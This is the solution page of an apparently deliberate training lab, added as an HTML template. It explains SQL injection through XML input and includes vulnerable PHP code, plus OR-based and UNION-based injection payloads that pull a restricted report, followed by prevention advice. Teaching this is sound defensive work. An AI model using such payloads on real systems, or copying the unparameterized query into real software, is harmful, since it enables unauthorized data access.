@@ -1,0 +1,202 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: SQL Injection Level 15{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-success text-white">
+                <h2 class="text-center">Solution: Level 15 - SQL Injection via XML</h2>
+            </div>
+            <div class="card-body">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates a SQL injection vulnerability in an application that processes XML data. The vulnerability occurs when the application extracts values from XML elements and uses them directly in SQL queries without proper validation or parameterization.
+                </p>
+                <p>
+                    XML-based SQL injection is particularly dangerous because:
+                </p>
+                <ul>
+                    <li>XML processing often happens server-side, making it less visible to security testing</li>
+                    <li>Developers may focus on XML parsing security (like XXE) but overlook SQL injection risks</li>
+                    <li>XML data may come from trusted sources, leading to less scrutiny of its contents</li>
+                    <li>Complex XML structures can hide malicious payloads</li>
+                </ul>
+
+                <h3>The Vulnerable Code</h3>
+                <p>
+                    The vulnerability exists in how the application processes the XML data and uses it in SQL queries. Here's a simplified example of the vulnerable code:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>// Vulnerable code example (PHP)
+$xml_data = $_POST['xml_data'];
+
+// Parse the XML
+$xml = simplexml_load_string($xml_data);
+
+// Extract values from XML
+$type = (string)$xml->type;
+$period = (string)$xml->period;
+$department = (string)$xml->department;
+
+// Vulnerable SQL query
+$query = "SELECT report_id, title, data, created_at
+          FROM reports
+          WHERE type = '$type' AND department = '$department' AND period = '$period'";
+
+$result = mysqli_query($conn, $query);</code></pre>
+                <p>
+                    The vulnerability is in the direct use of XML values in the SQL query without proper sanitization or parameterization.
+                </p>
+
+                <h3>Solution</h3>
+                <p>To exploit this vulnerability, follow these steps:</p>
+
+                <h4>1. Identify the Vulnerable XML Elements</h4>
+                <p>
+                    First, we need to identify which XML elements are used in the SQL query. Based on the challenge description and the default XML template, the application is using the <code>type</code>, <code>period</code>, and <code>department</code> elements in its SQL query.
+                </p>
+
+                <h4>2. Test for SQL Injection</h4>
+                <p>
+                    We can test for SQL injection by inserting a single quote into one of the XML elements to see if it causes an error or unexpected behavior:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>&lt;report&gt;
+  &lt;type&gt;sales'&lt;/type&gt;
+  &lt;period&gt;monthly&lt;/period&gt;
+  &lt;department&gt;electronics&lt;/department&gt;
+&lt;/report&gt;</code></pre>
+                </div>
+                <p>
+                    If the application is vulnerable, this might cause an SQL error or return no results.
+                </p>
+
+                <h4>3. Craft a SQL Injection Payload</h4>
+                <p>
+                    Once we've confirmed the vulnerability, we can craft a payload to access the restricted report with ID 999. We can use the <code>type</code> element for our injection:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>&lt;report&gt;
+  &lt;type&gt;sales' OR report_id=999 OR '1'='1&lt;/type&gt;
+  &lt;period&gt;monthly&lt;/period&gt;
+  &lt;department&gt;electronics&lt;/department&gt;
+&lt;/report&gt;</code></pre>
+                </div>
+                <p>
+                    When this XML is processed, the resulting SQL query will be:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT report_id, title, data, created_at
+FROM reports
+WHERE type = 'sales' OR report_id=999 OR '1'='1' AND department = 'electronics' AND period = 'monthly'</code></pre>
+                <p>
+                    This query will return the report with ID 999, regardless of its type, department, or period.
+                </p>
+
+                <h4>4. Alternative Approach: Using UNION-based Injection</h4>
+                <p>
+                    We can also use a UNION-based injection to retrieve the restricted report:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>&lt;report&gt;
+  &lt;type&gt;sales' UNION SELECT report_id, title, data, created_at FROM reports WHERE report_id=999 -- &lt;/type&gt;
+  &lt;period&gt;monthly&lt;/period&gt;
+  &lt;department&gt;electronics&lt;/department&gt;
+&lt;/report&gt;</code></pre>
+                </div>
+                <p>
+                    This will cause the application to execute:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT report_id, title, data, created_at
+FROM reports
+WHERE type = 'sales' UNION SELECT report_id, title, data, created_at FROM reports WHERE report_id=999 -- ' AND department = 'electronics' AND period = 'monthly'</code></pre>
+                <p>
+                    The <code>--</code> comments out the rest of the query, and the UNION combines the results of the original query with the results of our injected query.
+                </p>
+
+                <h4>5. Using Multiple XML Elements for Injection</h4>
+                <p>
+                    If one element is properly sanitized, we can try injecting through other elements:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>&lt;report&gt;
+  &lt;type&gt;sales&lt;/type&gt;
+  &lt;period&gt;monthly' OR report_id=999 OR '&lt;/period&gt;
+  &lt;department&gt;electronics&lt;/department&gt;
+&lt;/report&gt;</code></pre>
+                </div>
+                <p>
+                    This flexibility in where to place the injection makes XML-based SQL injection particularly versatile.
+                </p>
+
+                <h3>Real-world Impact</h3>
+                <p>
+                    XML-based SQL injection vulnerabilities are particularly relevant in:
+                </p>
+                <ul>
+                    <li><strong>Business Intelligence Systems</strong>: Many BI tools process XML-formatted reports</li>
+                    <li><strong>Enterprise Service Buses (ESBs)</strong>: XML is commonly used for message exchange</li>
+                    <li><strong>SOAP Web Services</strong>: SOAP uses XML for request and response messages</li>
+                    <li><strong>Configuration Management Systems</strong>: XML is often used for configuration data</li>
+                </ul>
+                <p>
+                    Notable real-world examples include:
+                </p>
+                <ul>
+                    <li><strong>SAP Business Intelligence (2018)</strong>: A vulnerability in XML report processing allowed attackers to access sensitive business data</li>
+                    <li><strong>Oracle Business Intelligence (2019)</strong>: A SQL injection vulnerability in XML data processing affected multiple versions</li>
+                </ul>
+
+                <h3>Prevention</h3>
+                <p>To prevent XML-based SQL injection vulnerabilities, developers should:</p>
+                <ul>
+                    <li>
+                        <strong>Use Parameterized Queries</strong> or prepared statements:
+                        <pre class="bg-light p-3 rounded"><code>// Safe code example (PHP with PDO)
+$xml = simplexml_load_string($xml_data);
+
+// Extract values from XML
+$type = (string)$xml->type;
+$period = (string)$xml->period;
+$department = (string)$xml->department;
+
+// Safe parameterized query
+$stmt = $pdo->prepare("SELECT report_id, title, data, created_at
+                      FROM reports
+                      WHERE type = ? AND department = ? AND period = ?");
+$stmt->execute([$type, $department, $period]);
+$reports = $stmt->fetchAll();</code></pre>
+                    </li>
+                    <li>
+                        <strong>Validate XML Input</strong>:
+                        <ul>
+                            <li>Use XML Schema Definition (XSD) to validate XML structure and data types</li>
+                            <li>Implement input validation for XML values</li>
+                            <li>Reject XML with unexpected elements or attributes</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Implement Proper Error Handling</strong>:
+                        <ul>
+                            <li>Avoid exposing detailed error messages to users</li>
+                            <li>Log errors for debugging but return generic messages to users</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Apply the Principle of Least Privilege</strong>:
+                        <ul>
+                            <li>Use database accounts with minimal permissions</li>
+                            <li>Restrict access to sensitive data through proper authorization</li>
+                        </ul>
+                    </li>
+                </ul>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('sqli_level15') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
